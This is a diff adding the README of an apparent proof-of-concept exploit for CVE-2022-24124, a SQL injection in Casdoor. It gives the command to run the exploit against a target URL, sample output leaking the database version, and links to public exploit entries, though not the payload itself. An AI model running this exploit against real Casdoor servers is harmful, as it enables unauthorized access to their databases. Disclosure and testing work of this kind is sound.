@@ -1,0 +1,21 @@
+# POC for CVE-2022-24124
+
+> Exploit Code for [CVE-2022-24124](https://nvd.nist.gov/vuln/detail/CVE-2022-24124) aka Casdoor SQL Injection
+
+Exploit Links: [[ExploitDB-50792](https://www.exploit-db.com/exploits/50792)] [[PacketStormSecurity](https://packetstormsecurity.com/files/166163/Casdoor-1.13.0-SQL-Injection.html)]
+
+Expected outcome: Dump SQL database version on host running Casdoor < 1.13.1
+
+Intended only for educational and testing in corporate environments.
+
+### Exploit Usage
+
+```shell
+Barricade➜ go run exploit.go -u http://127.0.0.1:8080
+
+-=Casdoor SQL Injection (CVE-2022-24124)=-
+- by Mayank Deshmukh (ColdFusionX)
+
+[*] Dumping Database Version
+XPATH syntax error: .12-MariaDB-0+deb11u1
+```
